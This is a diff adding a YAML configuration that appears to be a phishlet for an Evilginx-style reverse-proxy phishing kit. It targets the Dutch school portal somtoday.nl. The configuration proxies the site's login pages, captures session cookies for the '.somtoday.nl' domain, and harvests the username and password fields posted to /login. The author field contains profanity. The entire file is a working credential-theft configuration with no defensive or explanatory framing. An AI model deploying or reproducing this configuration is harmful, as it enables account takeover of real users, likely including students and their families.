@@ -1,0 +1,24 @@
+author: '@JERPUS JULLIE KANKER MOEDRS'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'somtoday.nl', session: true, is_landing: true}
+  - {phish_sub: 'events', orig_sub: 'events', domain: 'somtoday.nl', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'elo.somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'elo.somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.somtoday.nl'
+credentials:
+  username:
+    key: 'Gebruikersnaam'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Wachtwoord'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'somtoday.nl'
+  path: '/login'
